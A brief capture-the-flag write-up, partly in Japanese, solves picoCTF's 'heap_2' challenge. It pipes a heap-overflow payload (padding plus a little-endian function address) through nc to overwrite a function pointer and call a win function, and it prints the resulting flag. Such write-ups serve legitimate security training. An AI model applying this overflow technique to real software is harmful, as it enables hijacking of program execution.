# heap_2:binary Medium  
Can you handle function pointers?    
Additional details will be available after launching your challenge instance.  

# Solution  
バイナリとソースコードが渡される  
echo -e -n "2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\n3\n4\n" |nc mimas.picoctf.net 57974  

I have a function, I sometimes like to call it, maybe you should change it  

1. Print Heap  
2. Write to buffer  
3. Print x  
4. Print Flag  
5. Exit  

Enter your choice: Data for buffer:   
1. Print Heap  
2. Write to buffer  
3. Print x  
4. Print Flag  
5. Exit  

Enter your choice:   

x = �@  


1. Print Heap  
2. Write to buffer  
3. Print x  
4. Print Flag  
5. Exit  

Enter your choice: picoCTF{and_down_the_road_we_go_91218226}  

# 基礎知識  
echo  
文字列や変数の値を表示するコマンド   
リトルエンディアン  
数値の下位バイト（小さい桁）を先頭（低いアドレス）に置く方式  
例：０x4011a0　ー＞　a0　11　40  

# 考えたこと    
win関数を起動すれば良いことがコードを読むとわかった。echoコマンドで順に起動し、バッファオーバフローを用いてＸのアドレスを上書きする。その後、check_win関数を起動してＸのアドレスを実行することでwin関数が起動される。